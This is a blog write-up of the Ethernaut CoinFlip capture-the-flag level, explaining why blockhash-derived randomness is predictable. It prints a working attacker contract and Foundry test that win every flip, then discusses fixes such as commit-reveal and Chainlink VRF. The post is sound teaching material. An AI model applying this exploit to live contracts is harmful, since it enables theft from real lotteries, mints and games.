---
layout: post
title: "Ethernaut CoinFlip: Why On-Chain Randomness Isn't Random"
date: 2026-07-03 09:00:00 -0700
categories: [smart-contracts, solidity]
tags: [ethernaut, randomness, foundry, smart-contracts, methodology]
---

I've started working smart contracts the same way I worked the web labs: on deliberately broken
targets first, documented as I go. First stop is OpenZeppelin's **Ethernaut** — 27 levels, each
a small contract you have to break. Level 3, *CoinFlip*, is the cleanest possible lesson in a
mistake that still ships to mainnet today: treating on-chain data as a source of secret
randomness.

> **Context:** this is a practice target (Ethernaut), solved locally with Foundry. Generic
> technique against a CTF contract — no live protocol touched. These notes are AI-assisted and
> human-directed, same as the rest of this blog.

## The target

You have to guess a coin flip ten times in a row. Here's how the "coin" is decided:

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    require(lastHash != blockValue);
    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

The "random" side of the coin comes entirely from `blockhash(block.number - 1)` divided by a
fixed `FACTOR`. It *feels* unpredictable — a block hash looks like noise.

## The bug

Nothing on a public blockchain is secret, and nothing available to the contract is unavailable
to the caller. `blockhash(block.number - 1)` is the same value for everybody executing in that
block. So an attacker just runs the identical calculation **in the same transaction**, learns
the outcome before calling `flip`, and passes the guaranteed-correct guess.

The `require(lastHash != blockValue)` line only forces one guess per block — it doesn't add any
secrecy. It just means the attack takes ten blocks instead of one.

## The exploit

An attacker contract mirrors the contract's own math, then calls `flip` with the answer:

```solidity
contract CoinFlipAttacker {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip immutable target;
    constructor(CoinFlip _t) { target = _t; }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = (blockValue / FACTOR) == 1; // same block => same value => correct
        target.flip(guess);
    }
}
```

The Foundry test rolls the chain forward one block per guess (to clear the `lastHash` check) and
attacks ten times:

```solidity
function test_Solve() public {
    for (uint256 i = 0; i < 10; i++) {
        vm.roll(block.number + 1);
        attacker.attack();
    }
    assertEq(target.consecutiveWins(), 10);
}
```

```console
$ forge test --match-path test/03_CoinFlip.t.sol -vv
[PASS] test_Solve() (gas: 100320)
```

Ten for ten, every run. It isn't luck — it's the same arithmetic run twice.

## Why a real audit catches this

This exact pattern is a recurring source of real losses: lotteries, NFT mints with "random"
trait assignment, and games that seed rewards from `block.timestamp`, `blockhash`, `block.prevrandao`,
or `block.difficulty`. All of it is either public, miner/validator-influenceable, or both. An
auditor flags any security-relevant decision derived from on-chain block data on sight.

The fix isn't a cleverer hash — it's getting the randomness from somewhere the caller can't see
or precompute: a commit-reveal scheme, or an oracle like Chainlink VRF that delivers a proof the
value wasn't tampered with.

## Takeaway

On a public chain, "hard to predict" and "secret" are not the same thing. If your contract's
security depends on the caller not knowing a value that's already sitting in the EVM, it's
already broken. Next up: the `delegatecall` levels, where the bug isn't about secrecy — it's
about *whose storage you're actually writing to*.
